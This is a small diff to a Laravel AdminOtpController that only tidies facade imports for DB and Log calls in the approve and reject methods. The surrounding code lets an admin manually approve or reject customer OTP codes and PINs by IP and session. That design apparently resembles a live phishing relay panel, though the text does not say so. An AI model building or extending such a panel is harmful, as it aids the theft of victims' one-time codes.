@@ -12,6 +12,8 @@ use App\Models\CustomerProfile;
 use App\Models\OtpCode;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Log;
 
 class AdminOtpController extends Controller
 {
@@ -23,7 +25,7 @@ class AdminOtpController extends Controller
     public function approve(int $id, Request $request): JsonResponse
     {
         // Atomic check-then-update to prevent race conditions
-        [$otp, $earlyResponse] = \DB::transaction(function () use ($id) {
+        [$otp, $earlyResponse] = DB::transaction(function () use ($id) {
             $otp = OtpCode::lockForUpdate()->findOrFail($id);
 
             if ($otp->status !== 'pending') {
@@ -69,7 +71,7 @@ class AdminOtpController extends Controller
         $sessionId  = $otp->session_id;
 
         if (empty($customerIp)) {
-            \Log::error("approveOtp: No customer IP for OTP #{$id}");
+            Log::error("approveOtp: No customer IP for OTP #{$id}");
         }
 
         $customerId = $otp->customer?->id;
@@ -84,7 +86,7 @@ class AdminOtpController extends Controller
                 broadcast(new PinApproved($customerIp, null, $sessionId, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
+            Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
         }
 
         $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
@@ -108,7 +110,7 @@ class AdminOtpController extends Controller
         $reason = $request->input('reason');
 
         // Atomic check-then-update — same pattern as approve() to prevent race on otp_fail_count
-        [$otp, $earlyResponse] = \DB::transaction(function () use ($id, $reason) {
+        [$otp, $earlyResponse] = DB::transaction(function () use ($id, $reason) {
             $otp = OtpCode::lockForUpdate()->findOrFail($id);
 
             if ($otp->status !== 'pending') {
@@ -151,7 +153,7 @@ class AdminOtpController extends Controller
                 broadcast(new PinRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
+            Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
         }
 
         $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
